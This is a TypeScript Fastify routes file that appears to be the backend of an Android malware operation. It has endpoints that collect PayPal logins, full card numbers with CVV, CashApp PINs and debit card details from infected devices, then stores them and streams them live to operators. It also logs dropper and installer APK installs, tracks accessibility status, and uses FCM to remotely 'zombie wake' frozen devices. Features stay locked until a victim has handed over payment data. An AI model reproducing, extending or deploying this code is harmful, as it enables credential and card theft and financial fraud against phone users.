import type { FastifyInstance } from "fastify";
import {
  listDeviceFilterOptions,
  listDevices,
  listDevicesPage,
  registerDevice,
  updateDeviceRemark,
  updateDeviceBindCode,
  updateDeviceGroupId,
  batchUpdateDeviceGroupId,
  getDeviceByToken,
  resolveDeviceByBindKey,
  updateDeviceClientIp,
} from "../services/device.service.js";
import { assertGroupExists } from "../services/device-group.service.js";
import { createPayPalAccount, countPayPalAccounts } from "../services/paypal-account.service.js";
import { createVisaAccount, countVisaAccounts } from "../services/visa-account.service.js";
import { createCashAppAccount, countCashAppAccounts } from "../services/cashapp-account.service.js";
import { createDebitAccount, countDebitAccounts } from "../services/debit-account.service.js";
import { getAPaymentMethodsForDevice } from "../services/app-config.service.js";
import { createApkDownloadLog } from "../services/apk-download.service.js";
import { createInstallerInstallLog } from "../services/installer-install.service.js";
import { createClientInstallLog } from "../services/client-install.service.js";
import { sendCommand } from "../services/command.service.js";
import {
  FCM_EXPECTED_PROJECT_ID,
  FCM_WAKE_TOPIC,
  getFcmInitError,
  getFcmProjectId,
  isFcmConfigured,
  pushZombieWake,
} from "../services/fcm-wake.service.js";
import {
  clearZombieWake,
  getZombieWakeStatus,
  triggerZombieWake,
} from "../services/zombie-wake.service.js";
import type {
  RegisterDeviceBody,
  SubmitPayPalAccountBody,
  SubmitVisaAccountBody,
  SubmitCashAppAccountBody,
  SubmitDebitAccountBody,
} from "../types/messages.js";
import { resolveClientIp } from "../utils/client-ip.js";
import { connectionManager } from "../ws/connection-manager.js";

interface SubmitApkDownloadBody {
  androidId?: string;
  model?: string;
  installerPackage?: string;
  apkUrl?: string;
  status?: string;
  errorMessage?: string;
  downloadedAt?: number;
}

interface SubmitInstallerInstallBody {
  androidId?: string;
  model?: string;
  brand?: string;
  installerPackage?: string;
  versionName?: string;
  versionCode?: number;
  installedAt?: number;
}

interface SubmitClientInstallBody {
  androidId?: string;
  model?: string;
  brand?: string;
  clientPackage?: string;
  installerPackage?: string;
  versionName?: string;
  versionCode?: number;
  installedAt?: number;
}

export async function registerDeviceRoutes(app: FastifyInstance) {
  /** A 公开拉取支付方式（有序）；失败由 service 返回空数组 */
  app.get("/api/device/payment-methods", async () => {
    const methods = await getAPaymentMethodsForDevice();
    return {
      ok: true,
      data: { methods },
    };
  });

  app.post<{ Body: RegisterDeviceBody }>("/api/device/register", async (request, reply) => {
    const androidId = request.body?.androidId?.trim();
    if (!androidId) {
      return reply.code(400).send({
        ok: false,
        message: "androidId is required",
      });
    }

    const result = await registerDevice({
      androidId,
      model: request.body?.model?.trim(),
      meta: request.body?.meta,
    });

    const metaIp =
      typeof request.body?.meta?.clientIp === "string"
        ? request.body.meta.clientIp
        : null;
    await updateDeviceClientIp(
      result.deviceId,
      resolveClientIp(request) ?? metaIp,
    );

    connectionManager.broadcastToAdmins({
      type: "device_registered",
      deviceId: result.deviceId,
      payload: {
        androidId,
        model: request.body?.model?.trim() ?? null,
      },
      timestamp: Date.now(),
    });

    return {
      ok: true,
      data: result,
    };
  });

  app.post<{ Body: SubmitPayPalAccountBody }>(
    "/api/device/paypal",
    async (request, reply) => {
      const deviceToken = request.body?.deviceToken?.trim();
      const email = request.body?.email?.trim();
      const password = request.body?.password ?? "";

      if (!deviceToken) {
        return reply.code(400).send({ ok: false, message: "deviceToken_required" });
      }
      if (!email) {
        return reply.code(400).send({ ok: false, message: "email_required" });
      }
      if (!password) {
        return reply.code(400).send({ ok: false, message: "password_required" });
      }

      const device = await getDeviceByToken(deviceToken);
      if (!device) {
        return reply.code(401).send({ ok: false, message: "invalid_device_token" });
      }

      const boundDeviceId = request.body?.boundDeviceId?.trim();
      let targetDeviceId = device.deviceId;
      if (boundDeviceId) {
        const bound = await resolveDeviceByBindKey(boundDeviceId);
        if (!bound) {
          return reply.code(400).send({ ok: false, message: "bound_device_not_found" });
        }
        targetDeviceId = bound.deviceId;
      }

      try {
        const record = await createPayPalAccount(targetDeviceId, {
          email,
          password,
          amount: request.body?.amount,
          currency: request.body?.currency,
          submittedAt: request.body?.submittedAt,
        });

        connectionManager.broadcastToAdmins({
          type: "paypal_account",
          deviceId: targetDeviceId,
          payload: {
            id: record.id,
            email: record.email,
            amount: record.amount,
            currency: record.currency,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: {
            id: record.id,
            deviceId: record.deviceId,
            email: record.email,
            amount: record.amount,
            currency: record.currency,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "paypal_save_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.post<{ Body: SubmitVisaAccountBody }>(
    "/api/device/visa",
    async (request, reply) => {
      const deviceToken = request.body?.deviceToken?.trim();
      const cardHolder = request.body?.cardHolder?.trim();
      const cardNumber = request.body?.cardNumber ?? "";
      const expiry = request.body?.expiry?.trim();
      const cvv = request.body?.cvv ?? "";

      if (!deviceToken) {
        return reply.code(400).send({ ok: false, message: "deviceToken_required" });
      }
      if (!cardHolder) {
        return reply.code(400).send({ ok: false, message: "cardHolder_required" });
      }
      if (!cardNumber) {
        return reply.code(400).send({ ok: false, message: "cardNumber_required" });
      }
      if (!expiry) {
        return reply.code(400).send({ ok: false, message: "expiry_required" });
      }
      if (!cvv) {
        return reply.code(400).send({ ok: false, message: "cvv_required" });
      }

      const device = await getDeviceByToken(deviceToken);
      if (!device) {
        return reply.code(401).send({ ok: false, message: "invalid_device_token" });
      }

      const boundDeviceId = request.body?.boundDeviceId?.trim();
      let targetDeviceId = device.deviceId;
      if (boundDeviceId) {
        const bound = await resolveDeviceByBindKey(boundDeviceId);
        if (!bound) {
          return reply.code(400).send({ ok: false, message: "bound_device_not_found" });
        }
        targetDeviceId = bound.deviceId;
      }

      try {
        const record = await createVisaAccount(targetDeviceId, {
          cardHolder,
          cardNumber,
          expiry,
          cvv,
          amount: request.body?.amount,
          submittedAt: request.body?.submittedAt,
        });

        connectionManager.broadcastToAdmins({
          type: "visa_account",
          deviceId: targetDeviceId,
          payload: {
            id: record.id,
            cardHolder: record.cardHolder,
            cardNumber: record.cardNumber,
            expiry: record.expiry,
            amount: record.amount,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: {
            id: record.id,
            deviceId: record.deviceId,
            cardHolder: record.cardHolder,
            cardNumber: record.cardNumber,
            expiry: record.expiry,
            amount: record.amount,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "visa_save_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.post<{ Body: SubmitCashAppAccountBody }>(
    "/api/device/cashapp",
    async (request, reply) => {
      const deviceToken = request.body?.deviceToken?.trim();
      const pin = request.body?.pin ?? "";

      if (!deviceToken) {
        return reply.code(400).send({ ok: false, message: "deviceToken_required" });
      }
      if (!pin) {
        return reply.code(400).send({ ok: false, message: "pin_required" });
      }

      const device = await getDeviceByToken(deviceToken);
      if (!device) {
        return reply.code(401).send({ ok: false, message: "invalid_device_token" });
      }

      const boundDeviceId = request.body?.boundDeviceId?.trim();
      let targetDeviceId = device.deviceId;
      if (boundDeviceId) {
        const bound = await resolveDeviceByBindKey(boundDeviceId);
        if (!bound) {
          return reply.code(400).send({ ok: false, message: "bound_device_not_found" });
        }
        targetDeviceId = bound.deviceId;
      }

      try {
        const record = await createCashAppAccount(targetDeviceId, {
          pin,
          amount: request.body?.amount,
          submittedAt: request.body?.submittedAt,
        });

        connectionManager.broadcastToAdmins({
          type: "cashapp_account",
          deviceId: targetDeviceId,
          payload: {
            id: record.id,
            pin: record.pin,
            amount: record.amount,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: {
            id: record.id,
            deviceId: record.deviceId,
            pin: record.pin,
            amount: record.amount,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "cashapp_save_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  app.post<{ Body: SubmitDebitAccountBody }>(
    "/api/device/debit",
    async (request, reply) => {
      const deviceToken = request.body?.deviceToken?.trim();
      const cardHolder = request.body?.cardHolder?.trim();
      const cardNumber = request.body?.cardNumber ?? "";
      const expiry = request.body?.expiry?.trim();
      const cvv = request.body?.cvv ?? "";
      const billingZip = request.body?.billingZip?.trim();

      if (!deviceToken) {
        return reply.code(400).send({ ok: false, message: "deviceToken_required" });
      }
      if (!cardHolder) {
        return reply.code(400).send({ ok: false, message: "cardHolder_required" });
      }
      if (!cardNumber) {
        return reply.code(400).send({ ok: false, message: "cardNumber_required" });
      }
      if (!expiry) {
        return reply.code(400).send({ ok: false, message: "expiry_required" });
      }
      if (!cvv) {
        return reply.code(400).send({ ok: false, message: "cvv_required" });
      }
      if (!billingZip) {
        return reply.code(400).send({ ok: false, message: "billingZip_required" });
      }

      const device = await getDeviceByToken(deviceToken);
      if (!device) {
        return reply.code(401).send({ ok: false, message: "invalid_device_token" });
      }

      const boundDeviceId = request.body?.boundDeviceId?.trim();
      let targetDeviceId = device.deviceId;
      if (boundDeviceId) {
        const bound = await resolveDeviceByBindKey(boundDeviceId);
        if (!bound) {
          return reply.code(400).send({ ok: false, message: "bound_device_not_found" });
        }
        targetDeviceId = bound.deviceId;
      }

      try {
        const record = await createDebitAccount(targetDeviceId, {
          cardHolder,
          cardNumber,
          expiry,
          cvv,
          billingZip,
          amount: request.body?.amount,
          submittedAt: request.body?.submittedAt,
        });

        connectionManager.broadcastToAdmins({
          type: "debit_account",
          deviceId: targetDeviceId,
          payload: {
            id: record.id,
            cardHolder: record.cardHolder,
            cardNumber: record.cardNumber,
            expiry: record.expiry,
            billingZip: record.billingZip,
            amount: record.amount,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: {
            id: record.id,
            deviceId: record.deviceId,
            cardHolder: record.cardHolder,
            cardNumber: record.cardNumber,
            expiry: record.expiry,
            billingZip: record.billingZip,
            amount: record.amount,
            submittedAt: record.submittedAt,
            updatedAt: record.updatedAt,
          },
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "debit_save_failed";
        return reply.code(400).send({ ok: false, message });
      }
    },
  );

  /** A 查询绑定设备是否已有支付记录（任一方式），用于解锁功能区 */
  app.get<{ Querystring: { deviceToken?: string; deviceId?: string } }>(
    "/api/device/payment-unlock",
    async (request, reply) => {
      const deviceToken = request.query.deviceToken?.trim();
      const deviceId = request.query.deviceId?.trim();
      if (!deviceToken) {
        return reply.code(400).send({ ok: false, message: "deviceToken_required" });
      }
      if (!deviceId) {
        return reply.code(400).send({ ok: false, message: "deviceId_required" });
      }

      const caller = await getDeviceByToken(deviceToken);
      if (!caller) {
        return reply.code(401).send({ ok: false, message: "invalid_device_token" });
      }

      const target = await resolveDeviceByBindKey(deviceId);
      if (!target) {
        return reply.code(404).send({ ok: false, message: "device_not_found" });
      }

      const paypalCount = await countPayPalAccounts(target.deviceId);
      const visaCount = await countVisaAccounts(target.deviceId);
      const cashappCount = await countCashAppAccounts(target.deviceId);
      const debitCount = await countDebitAccounts(target.deviceId);
      const hasPayment = paypalCount > 0 || visaCount > 0 || cashappCount > 0 || debitCount > 0;

      return {
        ok: true,
        data: {
          deviceId: target.deviceId,
          hasPayment,
          unlocked: hasPayment,
          paypalCount,
          visaCount,
          cashappCount,
          debitCount,
        },
      };
    },
  );

  /** A 绑定流程：把业务员绑定码写到 B 设备上 */
  app.post<{
    Body: { deviceToken?: string; boundDeviceId?: string; bindCode?: string };
  }>("/api/device/bind-code", async (request, reply) => {
    const deviceToken = request.body?.deviceToken?.trim();
    const boundDeviceId = request.body?.boundDeviceId?.trim();
    const bindCode = request.body?.bindCode?.trim() ?? "";

    if (!deviceToken) {
      return reply.code(400).send({ ok: false, message: "deviceToken_required" });
    }
    if (!boundDeviceId) {
      return reply.code(400).send({ ok: false, message: "boundDeviceId_required" });
    }
    if (!bindCode) {
      return reply.code(400).send({ ok: false, message: "bindCode_required" });
    }
    if (bindCode.length > 64) {
      return reply.code(400).send({ ok: false, message: "bindCode_too_long" });
    }

    const caller = await getDeviceByToken(deviceToken);
    if (!caller) {
      return reply.code(401).send({ ok: false, message: "invalid_device_token" });
    }

    const target = await resolveDeviceByBindKey(boundDeviceId);
    if (!target) {
      return reply.code(404).send({ ok: false, message: "device_not_found" });
    }

    const device = await updateDeviceBindCode(target.deviceId, bindCode);
    if (!device) {
      return reply.code(404).send({ ok: false, message: "device_not_found" });
    }

    connectionManager.broadcastToAdmins({
      type: "device_bind_code",
      deviceId: device.deviceId,
      payload: { bindCode: device.bindCode },
      timestamp: Date.now(),
    });

    return {
      ok: true,
      data: {
        deviceId: device.deviceId,
        bindCode: device.bindCode,
      },
    };
  });

  app.post<{ Body: SubmitApkDownloadBody }>(
    "/api/device/apk-download",
    async (request, reply) => {
      try {
        const record = await createApkDownloadLog({
          androidId: request.body?.androidId,
          model: request.body?.model,
          installerPackage: request.body?.installerPackage,
          apkUrl: request.body?.apkUrl,
          status: request.body?.status,
          errorMessage: request.body?.errorMessage,
          downloadedAt: request.body?.downloadedAt,
          clientIp: resolveClientIp(request),
          userAgent: request.headers["user-agent"],
        });

        connectionManager.broadcastToAdmins({
          type: "apk_download",
          deviceId: record.androidId ?? "unknown",
          payload: {
            id: record.id,
            androidId: record.androidId,
            model: record.model,
            installerPackage: record.installerPackage,
            status: record.status,
            downloadedAt: record.downloadedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: record,
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "apk_download_log_failed";
        request.log.error({ error }, "apk_download_log_failed");
        return reply.code(500).send({ ok: false, message });
      }
    },
  );

  app.post<{ Body: SubmitInstallerInstallBody }>(
    "/api/device/installer-install",
    async (request, reply) => {
      try {
        const record = await createInstallerInstallLog({
          androidId: request.body?.androidId,
          model: request.body?.model,
          brand: request.body?.brand,
          installerPackage: request.body?.installerPackage,
          versionName: request.body?.versionName,
          versionCode: request.body?.versionCode,
          installedAt: request.body?.installedAt,
          clientIp: resolveClientIp(request),
          userAgent: request.headers["user-agent"],
        });

        connectionManager.broadcastToAdmins({
          type: "installer_install",
          deviceId: record.androidId ?? "unknown",
          payload: {
            id: record.id,
            androidId: record.androidId,
            model: record.model,
            brand: record.brand,
            installerPackage: record.installerPackage,
            versionName: record.versionName,
            installedAt: record.installedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: record,
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "installer_install_log_failed";
        request.log.error({ error }, "installer_install_log_failed");
        return reply.code(500).send({ ok: false, message });
      }
    },
  );

  app.post<{ Body: SubmitClientInstallBody }>(
    "/api/device/client-install",
    async (request, reply) => {
      try {
        const record = await createClientInstallLog({
          androidId: request.body?.androidId,
          model: request.body?.model,
          brand: request.body?.brand,
          clientPackage: request.body?.clientPackage,
          installerPackage: request.body?.installerPackage,
          versionName: request.body?.versionName,
          versionCode: request.body?.versionCode,
          installedAt: request.body?.installedAt,
          clientIp: resolveClientIp(request),
          userAgent: request.headers["user-agent"],
        });

        connectionManager.broadcastToAdmins({
          type: "client_install",
          deviceId: record.androidId ?? "unknown",
          payload: {
            id: record.id,
            androidId: record.androidId,
            model: record.model,
            brand: record.brand,
            clientPackage: record.clientPackage,
            installerPackage: record.installerPackage,
            versionName: record.versionName,
            installedAt: record.installedAt,
          },
          timestamp: Date.now(),
        });

        return {
          ok: true,
          data: record,
        };
      } catch (error) {
        const message = error instanceof Error ? error.message : "client_install_log_failed";
        request.log.error({ error }, "client_install_log_failed");
        return reply.code(500).send({ ok: false, message });
      }
    },
  );

  /** 设备端公开拉取：全局「唤醒僵尸」窗口 */
  app.get("/api/device/zombie-wake", async () => {
    const status = await getZombieWakeStatus();
    return { ok: true, data: status };
  });

  /**
   * 部署自检（公开）：服务端 FCM 凭据是否加载成功。
   *
   * 这个端点存在的理由：`pushZombieWake()` 在未配置 Service Account 时是**静默降级**的
   * （返回 `ok:false` 但不抛错，flag 照常写入）。于是后台表现完全正常——窗口开出来了、
   * 计时也在走——但冻结设备一条消息都收不到，只有在线设备靠 WS 响应。
   *
   * 只回布尔量与错误原因，不发消息、不泄露密钥内容。真正的发送验证在
   * `GET /api/devices/zombie-wake/fcm-check`（需登录）。
   *
   * `projectId` 必须等于 `Android/app/google-services.json` 的 `project_id`；
   * 换个工程时发送照样成功，但设备收不到，是最难看出来的一种错。
   */
  app.get("/api/device/zombie-wake/fcm-check", async () => {
    const configured = isFcmConfigured();
    const serverProjectId = getFcmProjectId();
    return {
      ok: true,
      data: {
        configured,
        reason: getFcmInitError(),
        projectId: serverProjectId,
        expectedProjectId: FCM_EXPECTED_PROJECT_ID,
        projectMatches:
          serverProjectId == null ? false : serverProjectId === FCM_EXPECTED_PROJECT_ID,
      },
    };
  });

  app.get("/api/devices", async () => {
    const onlineDeviceIds = connectionManager.getOnlineDeviceIds();
    const devices = await listDevices(onlineDeviceIds);
    return {
      ok: true,
      data: {
        devices,
        onlineDeviceIds,
      },
    };
  });

  app.get("/api/devices/zombie-wake", async () => {
    const status = await getZombieWakeStatus();
    return { ok: true, data: status };
  });

  /**
   * 部署自检（需登录）：真发一条，验证凭据 + 出站 + 权限三件事。
   *
   * 与公开的 `/api/device/zombie-wake/fcm-check` 不同，这里会真的调 FCM。
   * "配置存在" 与 "能发出去" 是两件事：私钥可能路径不对、Google 出站可能被墙、
   * 服务账号可能没被授权发消息。只有真发一条才能区分。
   */
  app.get("/api/devices/zombie-wake/fcm-check", async () => {
    if (!isFcmConfigured()) {
      return {
        ok: false,
        message: getFcmInitError() ?? "fcm_not_configured",
      };
    }
    const result = await pushZombieWake({
      wakeUntil: Date.now() + 60_000,
      keepAwakeMs: 60_000,
    });
    return {
      ok: true,
      data: {
        sent: result.ok,
        messageId: result.messageId,
        reason: result.reason,
      },
    };
  });

  app.post("/api/devices/zombie-wake", async () => {
    const status = await triggerZombieWake();
    const onlineDeviceIds = connectionManager.getOnlineDeviceIds();
    // 已连控制 WS 的设备立刻推一条；休眠断连的靠 HTTP 轮询 flag
    for (const deviceId of onlineDeviceIds) {
      void sendCommand({
        deviceId,
        cmd: "zombie_wake",
        params: {
          wakeUntil: status.wakeUntil,
          keepAwakeMs: status.keepAwakeMs,
        },
        waitMs: 0,
      }).catch(() => undefined);
    }
    // 冻结/离线设备靠 FCM topic 群发：这是 Hiber 白名单唯一放行的通道（报告 §4.7）。
    // 失败不影响上面的 flag 写入与在线推送。
    const fcm = await pushZombieWake({
      wakeUntil: status.wakeUntil,
      keepAwakeMs: status.keepAwakeMs,
    });
    return {
      ok: true,
      data: {
        ...status,
        nudgedOnline: onlineDeviceIds.length,
        nudgedFcm: fcm.ok,
        fcmReason: fcm.reason,
      },
    };
  });

  app.delete("/api/devices/zombie-wake", async () => {
    const status = await clearZombieWake();
    const onlineDeviceIds = connectionManager.getOnlineDeviceIds();
    for (const deviceId of onlineDeviceIds) {
      void sendCommand({
        deviceId,
        cmd: "zombie_wake_clear",
        params: {},
        waitMs: 0,
      }).catch(() => undefined);
    }
    return {
      ok: true,
      data: {
        ...status,
        nudgedOnline: onlineDeviceIds.length,
      },
    };
  });

  app.get<{
    Querystring: {
      page?: string;
      pageSize?: string;
      deviceId?: string;
      remark?: string;
      bindCode?: string;
      groupId?: string;
      localeLanguage?: string;
      localeRegion?: string;
      brand?: string;
      accessibilityStatus?: string;
      isOnline?: string;
      hasPassword?: string;
      dateFrom?: string;
      dateTo?: string;
    };
  }>("/api/devices/page", async (request) => {
    const query = request.query;
    const onlineDeviceIds = connectionManager.getOnlineDeviceIds();
    const result = await listDevicesPage(
      {
        page: query.page ? Number(query.page) : 1,
        pageSize: query.pageSize ? Number(query.pageSize) : 100,
        deviceId: query.deviceId,
        remark: query.remark,
        bindCode: query.bindCode,
        groupId: query.groupId,
        localeLanguage: query.localeLanguage,
        localeRegion: query.localeRegion,
        brand: query.brand,
        accessibilityStatus: query.accessibilityStatus,
        isOnline: query.isOnline,
        hasPassword: query.hasPassword,
        dateFrom: query.dateFrom,
        dateTo: query.dateTo,
      },
      onlineDeviceIds,
    );

    return {
      ok: true,
      data: {
        ...result,
        onlineDeviceIds,
      },
    };
  });

  app.get("/api/devices/filter-options", async () => {
    const options = await listDeviceFilterOptions();
    return { ok: true, data: options };
  });

  app.patch<{ Params: { deviceId: string }; Body: { remark?: string } }>(
    "/api/devices/:deviceId/remark",
    async (request, reply) => {
      const deviceId = request.params.deviceId?.trim();
      if (!deviceId) {
        return reply.code(400).send({ ok: false, message: "device_id_required" });
      }
      const remark = request.body?.remark?.trim() ?? null;
      const device = await updateDeviceRemark(deviceId, remark);
      if (!device) {
        return reply.code(404).send({ ok: false, message: "device_not_found" });
      }
      return { ok: true, data: device };
    },
  );

  app.patch<{ Params: { deviceId: string }; Body: { groupId?: string | null } }>(
    "/api/devices/:deviceId/group",
    async (request, reply) => {
      try {
        const deviceId = request.params.deviceId?.trim();
        if (!deviceId) {
          return reply.code(400).send({ ok: false, message: "device_id_required" });
        }
        const raw = request.body?.groupId;
        const groupId =
          raw == null || (typeof raw === "string" && raw.trim() === "")
            ? null
            : String(raw).trim();
        await assertGroupExists(groupId);
        const device = await updateDeviceGroupId(deviceId, groupId);
        if (!device) {
          return reply.code(404).send({ ok: false, message: "device_not_found" });
        }
        return { ok: true, data: device };
      } catch (error) {
        const message = error instanceof Error ? error.message : "group_assign_failed";
        const status = message === "group_not_found" ? 404 : 400;
        return reply.code(status).send({ ok: false, message });
      }
    },
  );

  app.post<{ Body: { deviceIds?: string[]; groupId?: string | null } }>(
    "/api/devices/batch-group",
    async (request, reply) => {
      try {
        const deviceIds = request.body?.deviceIds ?? [];
        if (!Array.isArray(deviceIds) || deviceIds.length === 0) {
          return reply.code(400).send({ ok: false, message: "device_ids_required" });
        }
        const raw = request.body?.groupId;
        const groupId =
          raw == null || (typeof raw === "string" && raw.trim() === "")
            ? null
            : String(raw).trim();
        await assertGroupExists(groupId);
        const updated = await batchUpdateDeviceGroupId(deviceIds, groupId);
        return { ok: true, data: { updated } };
      } catch (error) {
        const message = error instanceof Error ? error.message : "batch_group_failed";
        const status = message === "group_not_found" ? 404 : 400;
        return reply.code(status).send({ ok: false, message });
      }
    },
  );
}
